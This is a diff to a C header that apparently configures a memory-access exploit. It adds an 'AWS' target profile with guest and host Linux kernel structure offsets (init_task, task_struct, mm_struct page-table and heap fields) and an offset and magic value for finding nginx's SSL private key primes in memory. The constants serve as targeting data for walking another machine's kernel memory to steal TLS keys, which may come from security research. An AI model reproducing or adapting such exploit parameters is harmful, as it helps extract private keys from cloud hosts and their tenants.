@@ -66,6 +66,28 @@ typedef unsigned long pte_t; // page table entry - pfn is host physical
 #define SSLKEY_LEN		(4 + 128 + 4 + 128) // magic + prime1 + magic + prime2
 #define SSLKEY_MAGIC		0x00818102
 
+#elif MACHINE == AWS
+
+#define G_INIT_NAME		"swapper/"
+#define G_TEXT_INIT_TASK	0x2011f80	// struct task_struct init_task
+
+// struct task_struct {
+#define G_TASK_TASKS		0x890	// struct list_head tasks
+#define G_TASK_MM		0x940	// struct mm_struct *mm
+#define G_TASK_PID		(0x890+0xd0) // 0x9c0	// pid_t pid, tgid
+#define G_TASK_PID_LINKS	0x9f8	// struct hlist_node pid_links[PIDTYPE_MAX] <-- PID_TASKS
+#define G_TASK_COMM		0xb80	// char comm[TASK_COMM_LEN]
+// };
+
+// struct mm_struct {
+#define G_MM_PGD		0x78	// pgd_t *pgd
+#define G_MM_HEAP		0x158	// unsigned long start_brk
+// };
+
+#define NGINX_SSLKEY		0x8b99f
+#define SSLKEY_LEN		(4 + 128 + 4 + 128) // magic + prime1 + magic + prime2
+#define SSLKEY_MAGIC		0x00818102
+
 #endif // MACHINE
 
 
@@ -217,6 +239,7 @@ typedef unsigned long pte_t; // page table entry - pfn is host physical
 #define H_TASK_PRIOS		0x64	// int static_prio, normal_prio, rt_priority
 #define H_TASK_TASKS		0x908	// struct list_head tasks
 #define H_TASK_MM		0x958	// struct mm_struct *mm
+#define H_TASK_PID		0x9d8	// pid_t pid, tgid
 #define H_TASK_PID_LINKS	0xa78	// struct hlist_node pid_links[PIDTYPE_MAX] <-- PID_TASKS
 #define H_TASK_COMM		0xc48	// char comm[TASK_COMM_LEN]
 // };
@@ -296,7 +319,7 @@ typedef unsigned long pte_t; // page table entry - pfn is host physical
 
 #elif MACHINE == AWS
 
-#define BASE		0xa1d35218UL
+// #define BASE		0xa1d35218UL
 // #define HOST_DIRECT_MAP	0xffff93e3c0000000
 // #define OWN_VCPU	0xffff93e461290000
 // #define 		0xffff93e46128b2a0
